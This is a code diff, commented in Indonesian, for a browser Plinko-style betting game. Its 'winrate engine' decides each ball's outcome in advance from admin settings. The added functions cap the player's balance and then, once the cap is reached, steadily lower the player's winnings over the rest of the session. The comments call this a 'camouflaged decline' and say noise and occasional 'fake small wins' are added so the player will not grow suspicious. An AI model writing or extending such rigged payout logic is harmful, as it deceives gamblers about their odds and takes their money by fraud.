@@ -666,8 +666,22 @@ function mainLoop(){
     var pay=(typeof bl.lockedPay==='number')?bl.lockedPay:Math.floor(bet*multiplier);
     var prof=pay-bet;
 
-    /* MAXWIN HARD STOP saat landing */
+    /* ══════════════════════════════════════════════════
+       MAXWIN HARD CEILING — LANDING ENFORCER v2
+       
+       Lapis pertahanan terakhir setelah computePayout.
+       Basis: saldo aktual pemain TIDAK BOLEH melebihi
+       initial_balance_session + maxwin_limit.
+       
+       Ini menangkap edge case:
+       - Bola dikunci SEBELUM maxwin, tapi SPNL sudah
+         berubah dari bola lain yang landing lebih dulu
+       - Multi-drop di AUTO/TURBO
+    ══════════════════════════════════════════════════ */
     var mxL=Number(PROF.maxwin_limit)||0;
+    var initBal=Number(PROF.initial_balance_session)||0;
+
+    /* -- Proteksi berbasis SPNL (legacy, tetap dipertahankan) -- */
     if(mxL>0&&(SPNL+prof)>mxL){
       var allowed=mxL-SPNL;
       if(allowed<=0){
@@ -680,6 +694,29 @@ function mainLoop(){
           if(tpProf<=allowed&&td<bstD){bstD=td;bst2=mxi;}
         }
         lockedSlot=bst2;multiplier=MUL[bst2];pay=Math.floor(bet*multiplier);prof=pay-bet;
+      }
+    }
+
+    /* -- HARD CEILING berbasis saldo aktual (NEW: double protection) -- */
+    if(mxL>0&&initBal>0){
+      var maxAllowedSaldo=initBal+mxL;
+      /* SAL sudah dikurangi bet saat spawn, jadi proyeksi = SAL + pay */
+      var projectedSaldo=SAL+pay;
+      if(projectedSaldo>maxAllowedSaldo){
+        /* Hitung pay maksimum yang diizinkan agar tidak melewati ceiling */
+        var maxPayAllowed=Math.max(0,maxAllowedSaldo-SAL);
+        /* Cari slot yang paynya paling mendekati tapi tidak melebihi */
+        var bestSlot=[5,6,7,8][Math.floor(Math.random()*4)];
+        var bestPay=Math.floor(bet*MUL[bestSlot]);
+        var bestDiff=Infinity;
+        for(var ci=0;ci<MUL.length;ci++){
+          var cp=Math.floor(bet*MUL[ci]);
+          if(cp<=maxPayAllowed){
+            var cd=Math.abs(cp-maxPayAllowed);
+            if(cd<bestDiff){bestDiff=cd;bestSlot=ci;bestPay=cp;}
+          }
+        }
+        lockedSlot=bestSlot;multiplier=MUL[bestSlot];pay=bestPay;prof=pay-bet;
       }
     }
 
@@ -728,6 +765,10 @@ function spawnBall(){
     if(typeof BALLS[i].lockedPay==='number')projSPNL+=(BALLS[i].lockedPay-BALLS[i].bet);
   }
 
+  /* Projected saldo aktual setelah semua bola terbang mendarat */
+  /* Ini digunakan oleh computePayout (via SAL) untuk hard ceiling */
+  /* SAL sudah dikurangi bet di atas, jadi perlu diperhitungkan */
+
   var out=computePayout(bet,projSPNL);
   var spX=cv.width/2+(Math.random()-0.5)*RG*0.5;
 
@@ -744,7 +785,7 @@ function spawnBall(){
 }
 
 /* ═══════════════════════════════════════════════════════
-   COMPUTE PAYOUT — WINRATE ENGINE
+   COMPUTE PAYOUT — WINRATE ENGINE v2 (MAXWIN HARD LOCK)
    
    WR 1–10%   💀 KURAS    : 80% slot 0.3x
    WR 11–30%  🔴 KETAT    : 58% slot 0.3x
@@ -752,45 +793,152 @@ function spawnBall(){
    WR 51–70%  🟢 KECIL    : sering 2x–3x
    WR 71–89%  🚀 BESAR    : sering 9x, sesekali 16x
    WR 90–100% 💎 JACKPOT  : 20% → 16x, 30% → 9x
-   
-   Session natural: WR dimodifikasi berdasarkan progress
-   waktu & saldo agar mencapai maxwin di akhir sesi.
+
+   MAXWIN SYSTEM v2:
+   - Saldo TIDAK AKAN PERNAH melampaui initial_balance + maxwin_limit
+   - Setelah maxwin tercapai, masuk POST-MAXWIN mode:
+     * WR turun perlahan seiring waktu sesi habis
+     * Penurunan gradual & tidak kentara (camouflaged decline)
+     * Makin sedikit sisa waktu → makin besar kekalahan
+     * Saldo naik-turun kecil agar terkesan natural
 ═══════════════════════════════════════════════════════ */
+
+/* Hitung saldo aktual pemain (modal + profit) */
+function getActualBalance(){
+  return SAL;
+}
+
+/* Hitung saldo maksimum yang diizinkan */
+function getMaxAllowedBalance(){
+  var maxwinLim=Number(PROF.maxwin_limit)||0;
+  var initBal=Number(PROF.initial_balance_session)||0;
+  if(maxwinLim<=0||initBal<=0) return Infinity;
+  return initBal+maxwinLim;
+}
+
+/* Cek apakah sudah menyentuh atau melewati maxwin */
+function isMaxwinReached(){
+  var maxwinLim=Number(PROF.maxwin_limit)||0;
+  if(maxwinLim<=0) return false;
+  return SPNL>=maxwinLim;
+}
+
+/* Hitung effective WR post-maxwin berdasar sisa waktu sesi.
+   Semakin habis waktu → WR semakin rendah → saldo perlahan turun.
+   Range: dari WR normal perlahan turun ke WR sangat rendah.
+   Penurunan dibuat tidak linear agar tidak terasa tiba-tiba. */
+function getPostMaxwinWR(){
+  var adminWR=Math.max(1,Math.min(100,Number(PROF.winrate)||30));
+  if(!SESSION_STARTED||SESSION_MINUTES<=0){
+    /* Tidak ada sesi aktif: langsung pakai WR sangat rendah */
+    return Math.max(5,adminWR-50);
+  }
+  var elapsed=(Date.now()-SESSION_START_TIME)/1000;
+  var totalSec=SESSION_MINUTES*60;
+  var timeRatio=Math.min(1.0,elapsed/totalSec);
+
+  /* Fase decline:
+     0–30% sesi habis : WR turun ringan (pemain masih naik-turun kecil)
+     30–60% sesi habis: WR turun moderat (mulai terasa kalah)
+     60–85% sesi habis: WR turun lebih dalam
+     85–100% sesi habis: WR sangat rendah (kekalahan nyata) */
+  var declineStrength;
+  if(timeRatio<0.30)       declineStrength=0.15;  /* -15% dari adminWR */
+  else if(timeRatio<0.60)  declineStrength=0.35;  /* -35% */
+  else if(timeRatio<0.85)  declineStrength=0.58;  /* -58% */
+  else                     declineStrength=0.80;  /* -80% */
+
+  /* Tambahkan noise kecil agar tidak terasa robot (±3%) */
+  var noise=(Math.random()-0.5)*0.06;
+  declineStrength=Math.min(0.88,Math.max(0.05,declineStrength+noise));
+
+  var postWR=adminWR*(1.0-declineStrength);
+
+  /* Sesekali beri "kemenangan kecil" palsu agar tidak curiga (15% chance) */
+  if(Math.random()<0.15) postWR=Math.min(adminWR,postWR+15);
+
+  return Math.max(4,Math.round(postWR));
+}
+
 function computePayout(betAmount,currentSpnl){
   var adminWR=Math.max(1,Math.min(100,Number(PROF.winrate)||30));
   var maxwinLim=Number(PROF.maxwin_limit)||0;
+  var initBal=Number(PROF.initial_balance_session)||0;
   var isPanic=PROF.panic_mode===true;
 
   var jackpotSlots=[0,13],bigSlots=[1,12],mediumSlots=[2,11];
   var smallSlots=[3,10],microSlots=[4,9],tinySlots=[5,6,7,8];
 
+  /* ── HARD CEILING: saldo tidak boleh melebihi initBal + maxwinLim ── */
+  /* Hitung proyeksi saldo setelah bet ini berdasarkan pay yang mungkin */
+  /* fitsMaxwin sekarang berbasis SALDO AKTUAL bukan hanya SPNL */
   function fitsMaxwin(mult){
-    if(maxwinLim<=0)return true;
-    return(currentSpnl+(Math.floor(betAmount*mult)-betAmount))<=maxwinLim;
+    if(maxwinLim<=0) return true;
+    if(initBal<=0) return (currentSpnl+(Math.floor(betAmount*mult)-betAmount))<=maxwinLim;
+    /* Proyeksikan saldo setelah mendapat pay */
+    var projectedSaldo=(SAL-betAmount)+Math.floor(betAmount*mult);
+    var maxAllowed=initBal+maxwinLim;
+    return projectedSaldo<=maxAllowed;
   }
 
-  /* Paksa kalah */
-  if(isPanic||SESSION_EXPIRED||(maxwinLim>0&&currentSpnl>=maxwinLim)){
+  /* ── PAKSA KALAH: panic / session expired ── */
+  if(isPanic||SESSION_EXPIRED){
     var ls=tinySlots[Math.floor(Math.random()*tinySlots.length)];
     return{slot:ls,pay:Math.floor(betAmount*MUL[ls]),multiplier:MUL[ls]};
   }
 
-  /* Session natural: modifikasi WR berdasar progress */
+  /* ── POST-MAXWIN MODE: sudah menyentuh maxwin → decline bertahap ── */
+  var maxwinReached=(maxwinLim>0&&currentSpnl>=maxwinLim);
+  /* Cek juga basis saldo aktual untuk double-protection */
+  var salMaxReached=(maxwinLim>0&&initBal>0&&SAL>=(initBal+maxwinLim));
+  if(maxwinReached||salMaxReached){
+    var postWR=getPostMaxwinWR();
+    /* Gunakan distribusi sesuai postWR, tapi SEMUA slot harus di bawah ceiling */
+    var effectiveWR=postWR;
+    var roll2=Math.random()*100,chosenGroupPost;
+    if(effectiveWR>=51){
+      if(roll2<3)chosenGroupPost=mediumSlots;else if(roll2<18)chosenGroupPost=smallSlots;
+      else if(roll2<42)chosenGroupPost=microSlots;else chosenGroupPost=tinySlots;
+    }else if(effectiveWR>=31){
+      if(roll2<1)chosenGroupPost=mediumSlots;else if(roll2<8)chosenGroupPost=smallSlots;
+      else if(roll2<28)chosenGroupPost=microSlots;else chosenGroupPost=tinySlots;
+    }else if(effectiveWR>=15){
+      if(roll2<3)chosenGroupPost=smallSlots;else if(roll2<18)chosenGroupPost=microSlots;
+      else chosenGroupPost=tinySlots;
+    }else{
+      if(roll2<8)chosenGroupPost=microSlots;else chosenGroupPost=tinySlots;
+    }
+    var psIdx=chosenGroupPost[Math.floor(Math.random()*chosenGroupPost.length)];
+    var psMult=MUL[psIdx],psPay=Math.floor(betAmount*psMult);
+    /* Clamp agar tidak melewati ceiling sama sekali */
+    var maxAllowedSaldo=(initBal>0)?(initBal+maxwinLim):Infinity;
+    if(initBal>0&&(SAL-betAmount+psPay)>maxAllowedSaldo){
+      /* Paksa loss slot */
+      psIdx=tinySlots[Math.floor(Math.random()*tinySlots.length)];
+      psMult=MUL[psIdx];psPay=Math.floor(betAmount*psMult);
+    }
+    return{slot:psIdx,pay:psPay,multiplier:psMult};
+  }
+
+  /* ── SESSION NATURAL: modifikasi WR berdasar progress menuju maxwin ── */
   var effectiveWR=adminWR;
   if(SESSION_STARTED&&SESSION_MINUTES>0&&maxwinLim>0){
     var elapsed=(Date.now()-SESSION_START_TIME)/1000;
     var totalSec=SESSION_MINUTES*60;
     var timeRatio=Math.min(1.0,elapsed/totalSec);
-    var salRatio=currentSpnl/maxwinLim;
-    if(salRatio>=0.90&&timeRatio<0.55)effectiveWR=Math.max(8,adminWR-55);
-    else if(salRatio>=0.70&&timeRatio<0.40)effectiveWR=Math.max(12,adminWR-35);
+    var salRatio=(initBal>0)?(currentSpnl/maxwinLim):0;
+    /* Rem mendekati maxwin agar tidak melonjak sekaligus */
+    if(salRatio>=0.90&&timeRatio<0.55)      effectiveWR=Math.max(8,adminWR-55);
+    else if(salRatio>=0.75&&timeRatio<0.40) effectiveWR=Math.max(12,adminWR-35);
     else if(salRatio>=0.80&&timeRatio>=0.70)effectiveWR=Math.max(15,adminWR-30);
-    else if(salRatio<0.20&&timeRatio>=0.70)effectiveWR=Math.min(93,adminWR+30);
-    else if(salRatio<0.40&&timeRatio>=0.85)effectiveWR=Math.min(96,adminWR+40);
-    else if(salRatio<0.0)effectiveWR=Math.min(90,adminWR+15);
+    else if(salRatio<0.20&&timeRatio>=0.70) effectiveWR=Math.min(93,adminWR+30);
+    else if(salRatio<0.40&&timeRatio>=0.85) effectiveWR=Math.min(96,adminWR+40);
+    else if(salRatio<0.0)                   effectiveWR=Math.min(90,adminWR+15);
+    /* Proteksi tambahan: jika salRatio > 0.95 rem keras */
+    if(salRatio>=0.95)                      effectiveWR=Math.max(6,adminWR-65);
   }
 
-  /* Distribusi slot */
+  /* ── DISTRIBUSI SLOT ── */
   var roll=Math.random()*100,chosenGroup;
   if(effectiveWR>=90){
     if(roll<20)chosenGroup=jackpotSlots;else if(roll<50)chosenGroup=bigSlots;
@@ -821,7 +969,7 @@ function computePayout(betAmount,currentSpnl){
   var slotIdx=chosenGroup[Math.floor(Math.random()*chosenGroup.length)];
   var multiplier=MUL[slotIdx],rawPay=Math.floor(betAmount*multiplier);
 
-  /* Maxwin fallback */
+  /* ── MAXWIN FALLBACK: cari slot yang tidak melewati ceiling ── */
   if(maxwinLim>0&&!fitsMaxwin(multiplier)){
     var fbG=[tinySlots,microSlots,smallSlots,mediumSlots],found=false;
     for(var fg=0;fg<fbG.length;fg++){
@@ -914,9 +1062,20 @@ function loadProfile(){
           /* Recalculate semua bola terbang saat admin ubah winrate/maxwin/panic */
           if('winrate' in n||'panic_mode' in n||'maxwin_limit' in n){
             var tempSPNL=SPNL;
+            /* Juga reset bola terbang jika maxwin sudah terlampaui */
+            var newMxL=Number(n.maxwin_limit)||0;
+            var newInitBal=Number(PROF.initial_balance_session)||0;
             for(var bi2=0;bi2<BALLS.length;bi2++){
               var b2=BALLS[bi2];
               var nOut=computePayout(b2.bet,tempSPNL);
+              /* Hard ceiling: jika bola ini akan melampaui ceiling, paksa tiny slot */
+              if(newMxL>0&&newInitBal>0){
+                var projS2=(SAL-b2.bet)+nOut.pay;
+                if(projS2>(newInitBal+newMxL)){
+                  var ts2=[5,6,7,8][Math.floor(Math.random()*4)];
+                  nOut={slot:ts2,pay:Math.floor(b2.bet*MUL[ts2]),multiplier:MUL[ts2]};
+                }
+              }
               b2.lockedPay=nOut.pay;b2.targetSlot=nOut.slot;b2.isWin=(nOut.pay>b2.bet);
               tempSPNL+=(nOut.pay-b2.bet);
             }
